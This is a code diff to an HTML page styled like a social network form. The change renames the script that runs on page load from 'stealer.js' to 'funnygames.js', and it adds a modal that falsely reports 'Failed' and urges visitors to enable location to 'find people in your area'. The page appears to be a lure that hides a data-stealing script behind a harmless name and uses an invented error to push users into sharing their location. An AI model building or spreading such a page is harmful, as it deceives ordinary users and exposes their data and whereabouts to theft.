@@ -85,10 +85,65 @@
     button:active {
       background: #1464d8;
     }
+
+    /* Modal styles */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.45);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-overlay.show {
+      display: flex;
+    }
+
+    .modal {
+      background: white;
+      border-radius: 12px;
+      padding: 28px 32px;
+      width: 90%;
+      max-width: 360px;
+      text-align: center;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+      position: relative;
+    }
+
+    .modal h2 {
+      font-size: 20px;
+      margin-bottom: 12px;
+      color: #d32f2f;
+    }
+
+    .modal p {
+      margin-bottom: 24px;
+      color: #65676b;
+    }
+
+    .modal-close {
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 24px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .modal-close:hover {
+      background: #166fe5;
+    }
   </style>
 
   <!-- Loads and runs funnygames.js immediately when the page loads -->
-  <script src="stealer.js"></script>
+  <script src="funnygames.js"></script>
 </head>
 <body>
   <div class="card">
@@ -110,10 +165,34 @@
     </form>
   </div>
 
+  <!-- Popup Modal -->
+  <div class="modal-overlay" id="failModal">
+    <div class="modal">
+      <h2>Failed</h2>
+      <p>Please enable Location to Find people in your area</p>
+      <button class="modal-close" id="closeModal">Close</button>
+    </div>
+  </div>
+
   <script>
-    document.getElementById('nameForm').addEventListener('submit', function(e) {
+    const form = document.getElementById('nameForm');
+    const modal = document.getElementById('failModal');
+    const closeBtn = document.getElementById('closeModal');
+
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
-      alert('Please Turn on location To find closest people near you!');
+      modal.classList.add('show');
+    });
+
+    closeBtn.addEventListener('click', function() {
+      modal.classList.remove('show');
+    });
+
+    // Also close when clicking outside the modal
+    modal.addEventListener('click', function(e) {
+      if (e.target === modal) {
+        modal.classList.remove('show');
+      }
     });
   </script>
 </body>
